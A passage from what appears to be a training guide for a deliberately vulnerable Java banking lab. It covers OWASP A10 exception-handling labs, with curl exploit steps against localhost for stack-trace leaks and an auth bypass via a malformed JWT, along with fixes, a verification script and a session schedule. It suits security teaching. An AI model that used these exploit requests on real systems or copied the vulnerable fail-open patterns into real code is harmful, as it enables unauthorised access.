**Impact:** Arbitrary file placement on the server, inside the document root, served
with no authentication and no download disposition. In a container that interprets
scripts, that is remote code execution.

**Affected code:** `core/.../lab/a08/Lab22UploadController.java` — the client's
filename is used verbatim, the extension and content type are never checked, and
the file is written into the web root. `core/.../core/security/WebConfig.java`
maps `/uploads/**` as a static resource handler.

**Fix:** Validate the extension *and* the real content type server-side. Generate a
UUID-based filename so the original name is never used. Resolve the target path and
verify it stays inside the upload directory. Store uploads **outside** the web
root, and serve them through a handler that sets `Content-Disposition: attachment`
and a fixed `application/octet-stream` content type.

---

## A10 — Mishandling of Exceptional Conditions

---

### Lab 23 — Verbose Error: Stack Trace with Config Values `Low`

**Objective:** Trigger an unhandled exception to extract internal configuration.

**Exploit steps:**
```bash
# Pass a non-integer ID to trigger NumberFormatException
curl "http://localhost:8080/api/a10/transfers/account-summary?id=abc"
```
The response contains the full Java stack trace including:
- `NumberFormatException` and the exact conversion that failed
- The internal call chain — controller, repository, JDBC driver
- The request path (`/api/a10/transfers/account-summary`)
- A configuration snapshot, including `jwt.secret` and the datasource URL

**Impact:** Stack traces are roadmaps for attackers — they reveal exact file
paths, library versions with known CVEs, and configuration secrets.

**Affected code:** `core/.../lab/a10/Lab23VerboseErrorController.java` calls
`Integer.parseInt(id)` with no validation, and the `@RestControllerAdvice` in
`Lab4ErrorController` renders the exception.

**Fix:** Validate the input and handle the conversion explicitly:
```java
int accountId;
try {
    accountId = Integer.parseInt(id);
} catch (NumberFormatException e) {
    return ResponseEntity.badRequest().body(Map.of("error", "Invalid id"));
}
```
and set `server.error.include-stacktrace=never` in production.

---

### Lab 24 — Error-Based Info Disclosure: Type Coercion `Medium`

**Objective:** Send a string as an amount to trigger a type error that reveals the internal data model.

**Exploit steps:**
```bash
curl -X POST http://localhost:8080/api/a10/transfers/send \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account_id": 1, "to_account_id": 2, "amount": "notanumber"}'
```
The response reveals:
- The offending parameter name (`"parameter":"amount"`)
- The exception type (`java.lang.NumberFormatException`)
- The full stack trace, naming internal variables (`amount`, `balance`), the SQL
  query text with its table and column names, and the Java types involved

**Impact:** Leaks the application's internal data model. Attackers use the column
names for precise SQL injection and ORM exploitation.

**Affected code:** `core/.../lab/a10/Lab24TypeCoercionController.java` — the
amount arrives as a `String`, is converted with `new BigDecimal(...)` without
validation, and the caught exception's message and stack trace are returned to the
client.

**Fix:** Validate at the input boundary and return a generic message:
```java
BigDecimal amount;
try {
    amount = new BigDecimal(request.amount());
} catch (NumberFormatException e) {
    return ResponseEntity.badRequest().body(Map.of("error", "Invalid amount"));
}
```
Better still, bind a `BigDecimal` in the request record so Jackson performs the
validation and rejects the request with a 400 before it reaches your code.

---

### Lab 25 — Insecure Fallback: Auth Bypass on Exception `High`

**Objective:** Send a malformed JWT to trigger the `catch` fallback and get admin access.

**Exploit steps:**
```bash
# Send a deliberately malformed token (not even valid base64)
curl -H "Authorization: Bearer THISISNOTAVALIDTOKEN" \
  http://localhost:8080/api/a10/transfers/history
```
The decode raises an exception, the bare `catch (Exception ignored)` swallows it,
and the principal stays at the default — `user_id = 1`, `username = "admin"`,
`role = "admin"`. The response returns all transfers as admin.

```bash
# Confirm: garbage token vs. no token
curl -o /dev/null -w '%{http_code}\n' http://localhost:8080/api/a10/transfers/history
# 401
curl -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer garbage" \
  http://localhost:8080/api/a10/transfers/history
# 200 as admin!
```

**Impact:** Any client can access admin-level data by sending a deliberately
invalid token. The fallback "safe" default is actually the most dangerous possible
value — an error in authentication grants access.

**Affected code:** `core/.../core/security/AuthFilter.java` — the principal
defaults to `userId = 1L`, `username = "admin"`, `role = "admin"` *before* the
verification attempt, and the bare `catch (Exception ignored)` leaves it there.

**Fix:**
```java
// Replace:
Long userId = 1L;
String username = "admin";
String role = "admin";
try {
    ...
} catch (Exception ignored) { }

// With:
JwtService.TokenPayload payload;
try {
    payload = jwtService.decodeStrict(token);
} catch (JwtService.InvalidTokenException e) {
    response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
    response.getWriter().write("{\"error\":\"Invalid token\"}");
    return;
}
Long userId = payload.userId();
```
Never fail open. Exceptions in authentication logic must always fail closed (deny
access).

---

## Verifying the labs are still exploitable

```bash
./scripts/verify-labs.sh          # verify all 25 labs
./scripts/verify-labs.sh 10 11 25 # verify specific labs
```

This script is the **inverse** of a regression suite: it must pass while the
vulnerabilities are present and fail once they have been fixed. That makes it the
checklist for the remediation pass — when you start fixing labs, this script is
how you know you have actually closed the hole (and how you know you have not
broken something else).

Expected result on an unfixed target:

```
Summary
  passed: 55
  failed: 0
```

---

## Training Session Guide

### Suggested timing (full day)

| Time | Content |
|------|---------|
| 09:00 | Setup, `docker compose up --build`, seed verification |
| 09:15 | Intro: OWASP Top 10 2025 overview, what SecureBank Labs demonstrates |
| 09:30 | **A01** — Access Control (Labs 1–3) |
| 10:30 | **A02** — Misconfiguration (Labs 4–6) |
| 11:00 | **A04** — Cryptographic Failures (Labs 7–9) |
| 11:30 | Break |
| 11:45 | **A05** — Injection (Labs 10–13): SQLi, SSTI×2, XSS |
| 13:00 | Lunch |
| 14:00 | **A06** — Insecure Design (Labs 14–16) |
| 14:30 | **A07** — Auth Failures (Labs 17–19) |
| 15:15 | **A08** — Integrity Failures (Labs 20–22) |
| 16:00 | **A10** — Exception Handling (Labs 23–25) |
| 16:45 | Q&A, recap, remediation principles |
| 17:00 | End |

### Half-day option (priority labs)

A01-Lab1 (IDOR) → A05-Lab10 (SQLi) → A05-Lab11 (SSTI) → A05-Lab13 (XSS) →
A07-Lab19 (Reset Token) → A08-Lab20 (Deserialization RCE) → A10-Lab25 (Auth
fallback)

### Key takeaways per category

| Category | Core message |
|----------|-------------|
| A01 | Authorization must be enforced server-side on every request |
| A02 | Defaults are insecure; every setting is a security decision |
| A04 | Cryptography is not optional; use purpose-built libraries |
| A05 | Never trust user input; parameterize everything |
| A06 | Security requirements must be designed in, not bolted on |
| A07 | Authentication is more than a password check |
| A08 | Only deserialize data you created and control |
| A10 | Exceptions must fail closed; never fail open |
